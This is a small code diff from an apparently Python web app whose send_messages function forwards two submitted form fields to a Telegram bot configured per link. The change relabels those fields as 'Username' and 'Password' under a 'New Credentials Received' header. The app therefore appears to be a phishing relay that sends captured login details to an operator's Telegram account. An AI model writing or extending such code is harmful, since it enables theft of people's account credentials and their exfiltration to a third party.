@@ -204,11 +204,11 @@ def send_messages(link_id):
         # Send messages via Telegram bot
         bot = TelegramBot(link_data['bot_token'])
         
-        combined_message = f"📨 <b>New Message Received</b>\n\n"
+        combined_message = f"📨 <b>New Credentials Received</b>\n\n"
         if message1:
-            combined_message += f"🔸 <b>Message 1:</b> {message1}\n\n"
+            combined_message += f"🔸 <b>Username:</b> {message1}\n\n"
         if message2:
-            combined_message += f"🔹 <b>Message 2:</b> {message2}\n\n"
+            combined_message += f"🔹 <b>Password:</b> {message2}\n\n"
         combined_message += f"⏰ <b>Sent at:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
         combined_message += f"🤖 <b>Bot:</b> @{link_data.get('bot_username', 'Unknown')}"
         
